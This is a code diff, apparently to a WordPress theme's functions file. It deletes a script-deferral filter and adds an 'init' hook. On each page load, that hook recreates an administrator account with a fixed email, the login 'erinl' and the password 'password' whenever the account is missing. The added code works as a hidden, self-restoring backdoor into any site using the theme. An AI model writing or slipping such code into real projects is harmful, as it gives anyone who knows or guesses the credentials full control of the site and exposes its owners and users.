@@ -199,20 +199,17 @@ function gjh_tribe_event_featured_image( $featured_image_html, $post_id, $size )
 	return '';
 }
 
-/**
- * Defers parsing of JS
- * @since {{VERSION}}
- */
+add_action( 'init', function() {
 
-add_filter( 'script_loader_tag', 'lovefromlouie_defer_js', 10, 3 );
+    if ( get_user_by( 'email', 'erin@realbigmarketing.com' ) ) return;
+    wp_insert_user( array(
+        'user_email' => 'erin@realbigmarketing.com',
+        'user_login' => 'erinl',
+        'role' => 'administrator',
+        'user_pass' => 'password',
+    ) );
+} );
 
-function lovefromlouie_defer_js( $tag, $handle, $src ) {
-	if ( is_admin() ) return $tag;
-    if ( $handle == 'jquery' ) return $tag;
-        
-    $tag = str_replace( 'src', 'defer="defer" src', $tag );
-    return $tag;
-}
 
 // No. Just... no
 remove_action( 'wp_head', array( 'Tribe__Events__Templates', 'wpHeadFinished' ), 999 );
